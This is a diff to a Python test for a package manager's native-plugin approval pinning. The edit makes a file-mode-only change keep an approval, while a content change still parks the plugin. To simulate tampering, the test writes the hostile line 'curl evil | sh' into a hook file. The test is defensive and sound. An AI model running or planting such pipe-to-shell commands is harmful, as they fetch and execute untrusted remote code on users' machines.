@@ -431,7 +431,12 @@ def _native_chain(tmp_path: Path, binary: Path, executables: dict) -> Chain:
 def test_native_plugin_is_approved_by_one_pin_over_its_whole_root(
     tmp_path: Path, apm_binary_path: Path
 ) -> None:
-    """A live-loaded plugin is one item: any byte or mode change parks it."""
+    """A live-loaded plugin is one item: any byte change parks it; the pin is portable.
+
+    The committed pin covers paths and bytes, not exec bits, so a mode-only
+    change (as a checkout on another operating system produces) keeps the
+    approval (#3989).
+    """
     chain = _native_chain(tmp_path, apm_binary_path, {})
     chain.ok("install", "--no-policy")
     assert not _registered(chain)
@@ -451,20 +456,18 @@ def test_native_plugin_is_approved_by_one_pin_over_its_whole_root(
     assert "plugin . whole plugin" in _text(chain.ok("approve", "--list"))
 
     sibling = chain.project / "pkgs" / "np" / "hooks" / "session-start"
-    for change in (
-        lambda: sibling.write_text("curl evil | sh\n", encoding="utf-8"),
-        lambda: sibling.chmod(0o755),
-    ):
-        sibling.write_text("echo hello\n", encoding="utf-8")
-        sibling.chmod(0o644)
-        chain.ok("install", "--no-policy")
-        assert _registered(chain)
-        change()
-        output = _text(chain.ok("install", "--no-policy"))
-        assert "Parked native plugin ./pkgs/np: content changed since approval" in output
-        assert "Re-approve: apm approve ./pkgs/np" in output
-        assert not _registered(chain), "a changed live-loaded plugin must not stay registered"
-        assert "[changed since approval]" in _text(chain.ok("approve", "--pending"))
+    sibling.chmod(0o755)
+    output = _text(chain.ok("install", "--no-policy"))
+    assert "Parked native plugin" not in output
+    assert _registered(chain), "a mode-only change keeps the portable approval"
+
+    sibling.chmod(0o644)
+    sibling.write_text("curl evil | sh\n", encoding="utf-8")
+    output = _text(chain.ok("install", "--no-policy"))
+    assert "Parked native plugin ./pkgs/np: content changed since approval" in output
+    assert "Re-approve: apm approve ./pkgs/np" in output
+    assert not _registered(chain), "a changed live-loaded plugin must not stay registered"
+    assert "[changed since approval]" in _text(chain.ok("approve", "--pending"))
 
     _approve(chain, "./pkgs/np")
     chain.ok("install", "--no-policy")
